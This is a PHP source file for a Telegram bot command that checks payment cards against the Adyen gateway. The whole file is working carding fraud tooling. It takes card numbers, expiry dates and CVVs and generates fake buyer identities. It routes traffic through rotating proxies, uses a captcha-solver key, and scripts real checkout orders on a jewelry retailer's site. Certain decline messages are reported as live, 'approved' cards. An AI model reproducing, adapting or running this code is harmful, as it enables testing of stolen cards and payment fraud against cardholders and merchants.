<?php
list($cmd) = explode(" ", $message);
if($cmd == "/ms" or $cmd == ".ms" or $cmd == "!ms"){      
$NameGater ='Mons';
$gateway = '/ms :'.$NameGater;
is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Adyen Auth</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!ms card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

AntiScript();
is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Adyen Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$message_id_1 = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #


$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"])  . strtolower($user["name"]["last"]) .rand(111,22222). '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];


$username = $user["name"]["first"].".".rand(22222,9999);
$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12);

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];



$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');

$curl = new CurlX;
$cookie = uniqid();

$data = [
'adyenkey' => '10001|CF2EDD7D768650E093D62000C51DFF703592C7824F84A50DEFFD994820F21022BD3B40824DD60E5A7D42B7911F4152B071551EC17F080C36E0BD544DDC59F9E5B66B0DD1DE7F3B6641E5B803A6100CEECDB83679BF3F2E9588CBA7C8AFBB06B81DA0826CF7FD15000E8C79AB8989AE8110F4AF7DE14D4D6CFDA895FD0E660C65233241A04219934E99A865E20AAE3391FDBE74CC63B96FE2CE5D24DB01A6DFC09B083658743F2380812FBEF63DB94D8224BCAF8403D506E2B80784CC1EF037E5FEC250C19E8B11807FB91850B6F90240BEDDEC82D79F12FB8E0EFA95461D4B9EC54A0548F16BE1C30252D25C35707F6A706B2B743844CE558C3A9D64520B066F',
'card' => $cc,
'month' => $mes,
'year' => $ano,
'cvv' => $cvv,
'version' => 'v2'
];

$req = $curl::Post('https://encryption-2yve.onrender.com/adyen', $data = json_encode($data), 
$headers = [
    "Content-Type: application/json",
    "enc-auth: 5ffe8342-2cb1-48c2-8d61-3365d2474a37",
],null,null);
$data = json_decode($req->body, true);
$encryptedCardNumber = $data["encryptedCardNumber"];
$encryptedExpiryMonth = $data["encryptedExpiryMonth"];
$encryptedExpiryYear = $data["encryptedExpiryYear"];
$encryptedSecurityCode = $data["encryptedSecurityCode"];
$riskData = $data["riskData"];



$rotate = rotate();
$socks5 = socks5();

$server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

$req = $curl::Get("https://www.drawelry.com/rest/v1/token?second_attr_dictionary_identifier=3.0", $headers = null , $cookie,$server);
echo $Bearer = $curl::ParseString($req->body, '"token":"', '"');

$headers = array();
$headers[] = 'Host: www.drawelry.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0';
$headers[] = 'Accept: application/json, text/plain, */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Authorization: Bearer '.$Bearer.'';
$headers[] = 'Origin: https://www.drawelry.com';
$headers[] = 'DNT: 1';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.drawelry.com/product-custom-birth-flower-ring-with-text-silver-cid103-drr0143?second_attr_dictionary_identifier=3.0';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'TE: trailers';


$req = $curl::Post('https://www.drawelry.com/rest/v1/cart/item' ,
$data = '{"item_id":null,"product_id":16,"qty":"","amount":null,"customize":{"master_attr_dictionary_identifier":{"value":"platinumplatedsilver"},"Engraving5":{"value":"Love Mor"},"group4":{"value":"1"},"second_attr_dictionary_identifier":{"value":"3.0"},"group4_items":[{"select5":{"value":"june-rose"}}]},"tracking_info":{"item_list_id":"product_own","item_id":"drr0143_platinumplatedsilver","parent_item_id":"","parent_item_spu":"","category":[{"id":383,"name":"JEWELRY"},{"id":3,"name":"RINGS"},{"id":103,"name":"Birthflower Rings"}]},"device":"pc"}', 
$headers, $cookie,$server );

$req = $curl::Get("https://www.drawelry.com/checkout/cart", $headers = null , $cookie,$server);

$req = $curl::Get("https://www.drawelry.com/checkout", $headers = null , $cookie,$server);


$headers = array();
$headers[] = 'Host: www.drawelry.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0';
$headers[] = 'Accept: application/json, text/plain, */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Authorization: Bearer '.$Bearer.'';
$headers[] = 'Origin: https://www.drawelry.com';
$headers[] = 'DNT: 1';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.drawelry.com/checkout';

$rand = rand(11111,99999);

$req = $curl::Post('https://www.drawelry.com/rest/v1/cart/addresses' ,
$data = '{"shipping_address":{"country_id":"US","firstname":"'.$firstname.'","lastname":"'.$lastname.'","telephone":"95247'.$rand.'","email":"'.$email.'","address_finder":"","street":"'.$street.'","street_detail":"","region":"Minnesota","region_id":"34","city":"Chanhassen","postcode":"55331","region_code":"","dial":"+1"},"use_shipping_address_as_billing_address":true}', 
$headers, $cookie,$server );


$headers = array();
$headers[] = 'Host: www.drawelry.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0';
$headers[] = 'Accept: application/json, text/plain, */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Authorization: Bearer '.$Bearer.'';
$headers[] = 'DNT: 1';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.drawelry.com/checkout';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'TE: trailers';


$req = $curl::Get("https://www.drawelry.com/rest/v1/cart/addresses", $headers  , $cookie,$server);

$req = $curl::Get("https://www.drawelry.com/rest/v1/cart/shipping-methods", $headers  , $cookie,$server);
echo $shipping_method = $curl::ParseString($req->body, '},"value":"', '"');

$headers = array();
$headers[] = 'Host: www.drawelry.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0';
$headers[] = 'Accept: application/json, text/plain, */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Authorization: Bearer '.$Bearer.'';
$headers[] = 'Origin: https://www.drawelry.com';
$headers[] = 'DNT: 1';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.drawelry.com/checkout';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Priority: u=1';

$req = $curl::Post('https://www.drawelry.com/rest/v1/cart/shipping-methods' ,
$data = '{"value":"'.$shipping_method.'"}', 
$headers, $cookie,$server );




$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0';
$headers[] = 'Accept: application/json, text/plain, */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Authorization: Bearer '.$Bearer.'';
$headers[] = 'Origin: https://www.drawelry.com';
$headers[] = 'DNT: 1';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.drawelry.com/checkout';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Priority: u=1';

$creditCardTypes = array(
    '4' => 'visa',
    '5' => 'mc',
    '3' => 'amex',
    '6' => 'discover'
);
$type = $creditCardTypes[substr($cc, 0,1)];

$uuid = sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
    mt_rand(0, 0xffff), mt_rand(0, 0xffff),
    mt_rand(0, 0xffff),
    mt_rand(0, 0x0fff) | 0x4000,
    mt_rand(0, 0x3fff) | 0x8000,
    mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
);

$cadena_entrada = uniqid();
$hash = hash('sha256', $cadena_entrada);
$hash_truncado = substr($hash, 0, 76);

$req1 = $curl::Post('https://www.drawelry.com/rest/v1/cart/place-order' ,
$data = '{"payment_method":"adyen_drop_in","device":"pc","additional_data":{"riskData":{"clientData":"'.$riskData.'"},"paymentMethod":{"type":"scheme","holderName":"","encryptedCardNumber":"'.$encryptedCardNumber.'","encryptedExpiryMonth":"'.$encryptedExpiryMonth.'","encryptedExpiryYear":"'.$encryptedExpiryYear.'","encryptedSecurityCode":"'.$encryptedSecurityCode.'","brand":"'.$type.'","checkoutAttemptId":"'.$uuid.''.$hash_truncado.'"},"browserInfo":{"acceptHeader":"*/*","colorDepth":24,"language":"es-CL","javaEnabled":false,"screenHeight":768,"screenWidth":1366,"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0","timeZoneOffset":300},"origin":"https://www.drawelry.com","clientStateDataIndicator":true},"utm_tags":null}', 
$headers, $cookie,$server);
echo $message = $curl::ParseString($req1->body, '"message":"', '"');


$tiempo_final = microtime(true); 
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);

edit_message($chatId,$message_id_1,$keyboard,urlencode("<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Adyen Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"));
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}

if(substr_count($req1->body, 'CVC Declined')){
$status = "APPROVED ✅ ";
$response = "CVC Declined";
}elseif(substr_count($req2->body, 'Gateway Rejected: cvv')){
$status = "APPROVED ✅ ";
$response = "Gateway Rejected: cvv";
}elseif(substr_count($req1->body, 'Not enough balance')){
$status = "APPROVED ✅ ";
$response = "Not enough balance";
}elseif(substr_count($req2->body, 'Gateway Rejected: avs')){
$status = "APPROVED ✅ ";
$response = "Gateway Rejected: avs";
}elseif(substr_count($req2->body, 'Add a new payment method')){
$status = "APPROVED ✅ ";
$response = "APPROVED";
}else{
$status = "Declined! ❌";
$response = $message;
}


edit_message($chatId,$message_id_1,$keyboard, $result = urlencode("<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Adyen Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"));

}

?>